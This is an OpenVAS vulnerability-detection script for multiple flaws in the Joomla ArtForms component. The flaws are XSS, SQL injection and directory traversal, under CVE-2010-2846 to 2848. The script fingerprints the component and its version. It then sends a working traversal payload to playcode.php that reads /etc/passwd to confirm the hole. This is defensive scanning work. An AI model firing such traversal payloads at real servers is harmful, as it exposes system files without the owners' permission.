###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_joomla_artforms_mult_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Joomla! ArtForms Component Multiple Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to insert arbitrary HTML
  or to execute arbitrary SQL commands or to read arbitrary files.
  Impact Level: Application";
tag_affected = "Joomla ArtForms version 2.1b7.2 RC2 and prior.";
tag_insight = "The flaws are due to
  - Error in the 'ArtForms' (com_artforms) component, allows remote attackers
    to inject arbitrary web script or HTML via the 'afmsg' parameter to
    'index.php'.
  - Directory traversal error in 'assets/captcha/includes/alikon/playcode.php'
    in the InterJoomla 'ArtForms' (com_artforms) component, allows remote
    attackers to read arbitrary files via a .. (dot dot) in the 'l' parameter.
  - Multiple SQL injection errors in the 'ArtForms' (com_artforms) component,
    allows remote attackers to execute arbitrary SQL commands via the 'viewform'
    parameter in a 'ferforms' and 'tferforms' action to 'index.php', and the
    'id' parameter in a 'vferforms' action to 'index.php'.";
tag_solution = "No solution or patch is available as of 30th July, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.joomla.org/download.html";
tag_summary = "This host is running Joomla and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(902219);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-08-02 12:38:17 +0200 (Mon, 02 Aug 2010)");
  script_bugtraq_id(41457);
  script_cve_id("CVE-2010-2846", "CVE-2010-2848", "CVE-2010-2847");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Joomla! ArtForms Component Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60162");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60161");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/60160");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14263/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/1007-exploits/joomlaartforms-sqltraversalxss.txt");

  script_description(desc);
  script_summary("Check Joomla ArtForms vulnerability by using exploit");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

jafPort = get_http_port(default:80);
if(!get_port_state(jafPort)){
  exit(0);
}

foreach path (make_list("/", "/Joomla150", "/joomla", cgi_dirs()))
{
  ## Send and recieve the response
  sndReq = http_get(item:string(path, "/index.php"), port:jafPort);
  rcvRes = http_send_recv(port:jafPort, data:sndReq);

  ## Confirm application is Ad peeps
  if(">Welcome to the Frontpage</" >< rcvRes)
  {
    sndReq = http_get(item:string(path, "/index.php?option=com_artforms"),
                                  port:jafPort);
    rcvRes = http_send_recv(port:jafPort, data:sndReq);

    ## Confirm the component
    if("ArtForms" >< rcvRes)
    {
      ver = eregmatch(string:rcvRes, pattern: "v. (([0-9.]+)(([a-zA-Z])?" +
                                     "([0-9.]+)?.?([a-zA-Z0-9.]+))?)");
      if(!isnull(ver[1])) {
       compVer = ereg_replace(pattern:"([a-z])|( )", string:ver[1], replace:".");
      }

      ## Try Exploit
      sndReq = http_get(item:string(path, "/components/com_artforms/assets/" +
                        "captcha/includes/alikon/playcode.php?l=../../../.." +
                        "/../../../../../../../../etc/passwd%00"), port:jafPort);
      rcvRes = http_send_recv(port:jafPort, data:sndReq);

      ## Check the response to confirm vulnerability
      if("root:x:" >< rcvRes && "root:/root:" >< rcvRes)
      {
        security_hole(jafPort);
        exit(0);
      }
    }
  }

  if(!isnull(compVer))
  {
    # Check for ArtForms <= 2.1b7.2 RC2
    if(version_is_less_equal(version:compVer, test_version:"2.1.7.2.RC2"))
    {
      security_hole(jafPort);
      exit(0);
    }
  }
}
